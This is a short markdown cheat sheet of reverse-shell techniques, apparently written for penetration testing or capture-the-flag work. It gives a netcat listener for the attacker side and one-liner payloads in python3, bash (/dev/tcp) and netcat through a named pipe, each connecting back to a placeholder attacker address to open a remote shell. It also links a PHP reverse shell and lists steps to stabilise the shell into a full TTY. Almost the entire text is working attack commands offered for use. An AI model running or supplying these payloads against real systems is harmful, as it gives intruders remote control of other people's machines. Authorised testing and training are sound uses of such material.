# Reverse Shell
Common ways to get a reverse shell from target
> https://www.revshells.com/

## Set up on attacker machine
```bash
nc -lnvp <port>
```

## Payloads
### python3
``` bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip-address>",,port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
Replace python3 with python if needed

### bash
``` bash
bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
```

### nc reverse shell through a named pipe
``` bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ip-address> <port> > /tmp/f
```

### php reverse shell
> https://github.com/pentestmonkey/php-reverse-shell  
Remember to change the ip-address and port

## Upgrading simple shells to fully interactive TTYs
> Also known as stabilize an unstable shell
#### Target Machine
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
```
#### Attacker Machine
```bash
stty raw -echo; fg
```
#### Target Machine
``` bash
export TERM=xterm
```